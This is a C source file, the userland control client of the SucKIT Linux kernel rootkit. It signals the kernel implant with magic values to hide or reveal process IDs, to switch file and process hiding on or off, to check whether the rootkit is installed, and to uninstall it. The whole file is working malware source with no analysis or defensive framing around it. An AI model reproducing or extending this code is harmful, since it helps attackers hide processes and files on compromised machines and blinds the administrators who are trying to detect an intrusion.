/*
 * $Id: client.c, communication between kernel <> user
 */

#include "stuff.h"

int	usage(char *s)
{
	printf("use:\n"
		"%s <uivfp> [args]\n"
		"u       - uninstall\n"
		"i       - make pid invisible\n"
		"v       - make pid visible\n"
		"f [0/1] - toggle file hiding\n"
		"p [0/1] - toggle pid hiding\n", s);
	return 1;
}

/* interface between kernel <> user */
int	skio(int cmd, sk_io *buf)
{
	buf->magic1 = MAGIC1;
	buf->magic2 = MAGIC2;
	buf->cmd = cmd;

	if (KCLIENT(buf) == MAGIC1)
		return buf->ret;
	return -1;
}

/* already installed check, 0 - not installed, 0x013a - installed */
int	installed()
{
	sk_io	buf;

	if (skio(0, &buf) < 0)
		return 0;
	printf("Detected version: %s\n", buf.buf);
	return buf.ret;
}

/* client - it does anything */
int	client(int argc, char **argv)
{
	sk_io	buf;
	int	i;
	uchar	c;

	if ((argc < 2) || (strlen(argv[1]) != 1))
		return usage(argv[0]);

	c = argv[1][0] & 0xdf;
	switch (c) {
		case 'U':
			if (skio(CMD_UNINSTALL, &buf) < 0) {
				printf("FUCK: Failed to uninstall (%d)\n",
					-buf.ret);
				return 1;
			}
			printf("Suckit uninstalled sucesfully!\n");
			return 0;
		case 'I':
			if ((argc < 3) ||
			    (sscanf(argv[2], "%u", (int *) &buf.arg) !=1 ))
				return usage(argv[0]);
			if (skio(CMD_HIDEPID, &buf) < 0) {
				printf("FUCK: Failed to hide pid %d (%d)\n",
				(int) buf.arg, (int) -buf.ret);
				return 1;
			}
			printf("Pid %d is hidden now!\n", (int) buf.arg);
			return 0;
		case 'V':
			if ((argc < 3) ||
			    (sscanf(argv[2], "%u", (int *) &buf.arg) !=1 ))
				return usage(argv[0]);
			if (skio(CMD_UNHIDEPID, &buf) < 0) {
				printf("FUCK: Failed to unhide pid %d (%d)\n",
				(int) buf.arg, (int) -buf.ret);
				return 1;
			}
			printf("Pid %d is visible now!\n", (int) buf.arg);
			return 0;
		case 'F':
		case 'P':
			i = 2;
			if (argc > 2) {
				if (sscanf(argv[2], "%d", &i) != 1)
					return usage(argv[0]);
			}
			buf.arg = i;
			if (skio((c=='F') ? CMD_FILEHIDING : CMD_PIDHIDING,
				&buf) < 0) {
				printf("Failed to change %s hiding (%d)!\n",
					(c=='F')?"file":"pid", -buf.ret);
				return 1;
			}
			printf("%s hiding is now %s!\n", (c=='F')?"file":"pid",
				(buf.ret)?"on":"off");
			return 1;
	}
	return usage(argv[0]);
}
